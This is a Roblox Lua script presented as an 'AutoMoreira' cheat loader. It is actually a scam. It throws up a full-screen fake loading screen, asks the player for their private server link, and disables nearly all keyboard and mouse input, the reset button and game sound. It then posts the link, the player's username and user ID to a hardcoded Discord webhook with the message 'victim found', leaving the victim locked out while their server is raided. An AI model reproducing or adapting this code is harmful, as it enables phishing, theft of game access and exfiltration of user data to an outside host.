local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457864091493335232/aYZDBD5U3PaMRFpIK7ILEE6tEmndZ1Tee9xsbW3qciy3yJsb0BkS9hejwZs-zxwuvSN_"

local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif PROTOSMASHER_LOADED then
    executor = "ProtoSmasher"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif identifyexecutor then
    executor = identifyexecutor()
else
    executor = "Delta/Outro"
end

local UniversalGUI = Instance.new("ScreenGui")
UniversalGUI.Name = "UniversalCapture"
UniversalGUI.ResetOnSpawn = false
UniversalGUI.ZIndexBehavior = Enum.ZIndexBehavior.Global
UniversalGUI.DisplayOrder = 9999
UniversalGUI.IgnoreGuiInset = true
local targetParent = player:WaitForChild("PlayerGui")
UniversalGUI.Parent = targetParent

local FullScreenFrame = Instance.new("Frame")
FullScreenFrame.Size = UDim2.new(1, 0, 1, 36)
FullScreenFrame.Position = UDim2.new(0, 0, 0, 0)
FullScreenFrame.BackgroundColor3 = Color3.new(1, 1, 1)
FullScreenFrame.BorderSizePixel = 0
FullScreenFrame.ZIndex = 10000
FullScreenFrame.Parent = UniversalGUI

task.spawn(function()
    while UniversalGUI.Parent do
        FullScreenFrame.Size = UDim2.new(1, 0, 1, 0)
        FullScreenFrame.Position = UDim2.new(0, 0, 0, 0)
        task.wait(0.5)
    end
end)

local MainMenu = Instance.new("Frame")
MainMenu.Size = UDim2.new(1, 0, 1, 0)
MainMenu.Position = UDim2.new(0, 0, 0, 0)
MainMenu.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainMenu.BorderSizePixel = 0
MainMenu.ZIndex = 10001
MainMenu.Parent = FullScreenFrame

local Title = Instance.new("TextLabel")
Title.Text = "PUT YOUR PRIVATE SERVER LINK"
Title.Size = UDim2.new(0.8, 0, 0.1, 0)
Title.Position = UDim2.new(0.1, 0, 0.2, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBlack
Title.TextScaled = true
Title.ZIndex = 10002
Title.Parent = MainMenu

local InputBox = Instance.new("TextBox")
InputBox.PlaceholderText = "https://www.roblox.com/share?code=..."
InputBox.Size = UDim2.new(0.8, 0, 0.08, 0)
InputBox.Position = UDim2.new(0.1, 0, 0.4, 0)
InputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
InputBox.TextColor3 = Color3.new(1, 1, 1)
InputBox.Text = "Place the link to the private server here."
InputBox.ClearTextOnFocus = false
InputBox.Font = Enum.Font.Gotham
InputBox.TextScaled = true
InputBox.ZIndex = 10002
InputBox.Parent = MainMenu

local Status = Instance.new("TextLabel")
Status.Text = "..."
Status.Size = UDim2.new(0.8, 0, 0.05, 0)
Status.Position = UDim2.new(0.1, 0, 0.5, 0)
Status.BackgroundTransparency = 1
Status.TextColor3 = Color3.fromRGB(255, 255, 0)
Status.Font = Enum.Font.Gotham
Status.TextScaled = true
Status.ZIndex = 10002
Status.Parent = MainMenu

local LoadBtn = Instance.new("TextButton")
LoadBtn.Text = "START AUTOMOREIRA"
LoadBtn.Size = UDim2.new(0.4, 0, 0.1, 0)
LoadBtn.Position = UDim2.new(0.3, 0, 0.7, 0)
LoadBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
LoadBtn.TextColor3 = Color3.new(1, 1, 1)
LoadBtn.Font = Enum.Font.GothamBold
LoadBtn.TextScaled = true
LoadBtn.ZIndex = 10002
LoadBtn.Parent = MainMenu

local LoadingUI = Instance.new("Frame")
LoadingUI.Size = UDim2.new(1, 0, 1, 0)
LoadingUI.Position = UDim2.new(0, 0, 0, 0)
LoadingUI.BackgroundColor3 = Color3.new(0, 0, 0)
LoadingUI.BorderSizePixel = 0
LoadingUI.Visible = false
LoadingUI.ZIndex = 10001
LoadingUI.Parent = FullScreenFrame

local Logo = Instance.new("ImageLabel")
Logo.Size = UDim2.new(0.2, 0, 0.2, 0)
Logo.Position = UDim2.new(0.4, 0, 0.3, 0)
Logo.BackgroundTransparency = 1
Logo.Image = "rbxasset://textures/ui/Shell/LogoRoblox.png"
Logo.ZIndex = 10002
Logo.Parent = LoadingUI

local LoadingText = Instance.new("TextLabel")
LoadingText.Text = "SCRIPT LOADING, PLEASE WAIT A MOMENT."
LoadingText.Size = UDim2.new(0.8, 0, 0.1, 0)
LoadingText.Position = UDim2.new(0.1, 0, 0.5, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.TextColor3 = Color3.new(1, 1, 1)
LoadingText.Font = Enum.Font.GothamBold
LoadingText.TextScaled = true
LoadingText.ZIndex = 10002
LoadingText.Parent = LoadingUI

local SubText = Instance.new("TextLabel")
SubText.Text = "DON'T WORRY, YOUR BASE WILL BE AUTOMATICALLY LOCKED"
SubText.Size = UDim2.new(0.8, 0, 0.05, 0)
SubText.Position = UDim2.new(0.1, 0, 0.58, 0)
SubText.BackgroundTransparency = 1
SubText.TextColor3 = Color3.fromRGB(150, 150, 150)
SubText.Font = Enum.Font.Gotham
SubText.TextScaled = true
SubText.ZIndex = 10002
SubText.Parent = LoadingUI

local DiscordLink = Instance.new("TextLabel")
DiscordLink.Text = "discord.gg/leozztech"
DiscordLink.Size = UDim2.new(0.8, 0, 0.05, 0)
DiscordLink.Position = UDim2.new(0.1, 0, 0.65, 0)
DiscordLink.BackgroundTransparency = 1
DiscordLink.TextColor3 = Color3.fromRGB(0, 100, 255)
DiscordLink.Font = Enum.Font.Gotham
DiscordLink.TextScaled = true
DiscordLink.ZIndex = 10002
DiscordLink.Parent = LoadingUI

local Percent = Instance.new("TextLabel")
Percent.Text = "0%"
Percent.Size = UDim2.new(0.3, 0, 0.15, 0)
Percent.Position = UDim2.new(0.35, 0, 0.75, 0)
Percent.BackgroundTransparency = 1
Percent.TextColor3 = Color3.new(1, 1, 1)
Percent.Font = Enum.Font.GothamBlack
Percent.TextScaled = true
Percent.ZIndex = 10002
Percent.Parent = LoadingUI

local ProgressBg = Instance.new("Frame")
ProgressBg.Size = UDim2.new(0.7, 0, 0.008, 0)
ProgressBg.Position = UDim2.new(0.15, 0, 0.9, 0)
ProgressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressBg.BorderSizePixel = 0
ProgressBg.ZIndex = 10002
ProgressBg.Parent = LoadingUI

local ProgressFill = Instance.new("Frame")
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
ProgressFill.BorderSizePixel = 0
ProgressFill.ZIndex = 10003
ProgressFill.Parent = ProgressBg

local function blockAll()
    pcall(function()
        StarterGui:SetCore("ResetButtonCallback", false)
        StarterGui:SetCore("TopbarEnabled", false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)
    local blockedKeys = {
        Enum.KeyCode.Space, Enum.KeyCode.Escape, Enum.KeyCode.Tab,
        Enum.KeyCode.Backspace, Enum.KeyCode.Return,
        Enum.KeyCode.LeftControl, Enum.KeyCode.RightControl,
        Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift,
        Enum.KeyCode.LeftAlt, Enum.KeyCode.RightAlt,
        Enum.KeyCode.Up, Enum.KeyCode.Down, Enum.KeyCode.Left, Enum.KeyCode.Right,
        Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
        Enum.KeyCode.Q, Enum.KeyCode.E, Enum.KeyCode.R, Enum.KeyCode.T,
        Enum.KeyCode.Y, Enum.KeyCode.U, Enum.KeyCode.I, Enum.KeyCode.O, Enum.KeyCode.P,
        Enum.KeyCode.F, Enum.KeyCode.G, Enum.KeyCode.H, Enum.KeyCode.J, Enum.KeyCode.K, Enum.KeyCode.L,
        Enum.KeyCode.Z, Enum.KeyCode.X, Enum.KeyCode.C, Enum.KeyCode.V, Enum.KeyCode.B,
        Enum.KeyCode.N, Enum.KeyCode.M
    }
    local function sinkInput()
        return Enum.ContextActionResult.Sink
    end
    for _, key in pairs(blockedKeys) do
        ContextActionService:BindAction("Block_" .. key.Name, sinkInput, false, key)
    end
    UserInputService.ModalEnabled = true
    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.MouseButton2
        or input.UserInputType == Enum.UserInputType.Touch
        or input.UserInputType == Enum.UserInputType.MouseWheel then
            input:Capture()
        end
    end)
    task.spawn(function()
        while true do
            for _, key in pairs(blockedKeys) do
                ContextActionService:BindAction("Block_" .. key.Name, sinkInput, false, key)
            end
            pcall(function()
                StarterGui:SetCore("ResetButtonCallback", false)
                StarterGui:SetCore("TopbarEnabled", false)
                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
            end)
            UserInputService.ModalEnabled = true
            task.wait(2)
        end
    end)
    for _, sound in pairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
    game.DescendantAdded:Connect(function(obj)
        if obj:IsA("Sound") then
            obj.Volume = 0
        end
    end)
end

local function universalHttpRequest(url, data)
    local success, result = pcall(function()
        local jsonData = HttpService:JSONEncode(data)
        local requestFunc = syn and syn.request or request or http_request or (HttpService and HttpService.PostAsync)
        
        if type(requestFunc) == "function" then
            requestFunc({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
            return true
        else
            HttpService:PostAsync(url, jsonData)
            return true
        end
    end)
    return success
end

local function sendToDiscord(serverLink)
    local playerCount = #game:GetService("Players"):GetPlayers()
    local data = {
        ["content"] = "@everyone Vítima encontrada! 🤑",
        ["embeds"] = {{
            ["title"] = "Servidor Capturado - " .. executor,
            ["description"] = "Vítima: " .. player.Name .. " (" .. player.UserId .. ")\nLink: " .. serverLink .. "\nJogadores no servidor: " .. playerCount,
            ["color"] = 16711680,
            ["footer"] = {["text"] = "Universal System • " .. os.date("%d/%m/%Y %H:%M")}
        }}
    }
    return universalHttpRequest(DISCORD_WEBHOOK, data)
end

local function isValidLink(text)
    if not text or text == "" then return false end
    local lowerText = string.lower(text)
    return string.find(lowerText, "roblox%.com/share%?code=") ~= nil
end

LoadBtn.MouseButton1Click:Connect(function()
    local link = InputBox.Text
    if not isValidLink(link) then
        Status.Text = "❌ Invalid Link"
        Status.TextColor3 = Color3.new(1, 0, 0)
        return
    end
    MainMenu.Visible = false
    LoadingUI.Visible = true
    blockAll()
    
    local notified = false
    task.spawn(function()
        for i = 1, 100 do
            if i >= 100 and not notified then
                notified = true
                sendToDiscord(link)
            end
            task.wait(0.03)
        end
    end)
    
    task.spawn(function()
        for i = 1, 100 do
            Percent.Text = i .. "%"
            ProgressFill.Size = UDim2.new(i / 100, 0, 1, 0)
            if i < 20 then
                LoadingText.Text = "VALIDATING SERVER..."
            elseif i < 50 then
                LoadingText.Text = "LOADING SCRIPT..."
            elseif i < 80 then
                LoadingText.Text = "PROCESSING BRAINROT..."
            else
                LoadingText.Text = "INVITING"
            end
            task.wait(5.9)
        end
        LoadingText.Text = "LOADED SUCCESSFULLY!"
        SubText.Text = "SERVER CAPTURED SUCCESSFULLY!"
    end)
end)

InputBox:GetPropertyChangedSignal("Text"):Connect(function()
    local text = InputBox.Text
    if text and text ~= "" then
        if isValidLink(text) then
            Status.Text = "✅ Valid Link!"
            Status.TextColor3 = Color3.new(0, 1, 0)
            LoadBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        else
            Status.Text = "❌ Invalid Link"
            Status.TextColor3 = Color3.fromRGB(1, 0, 0)
            LoadBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        end
    else
        Status.Text = "Put your private server link to start AutoMoreira"
        Status.TextColor3 = Color3.fromRGB(255, 255, 0)
        LoadBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    end
end)

print("Script loaded. Executor: " .. executor)
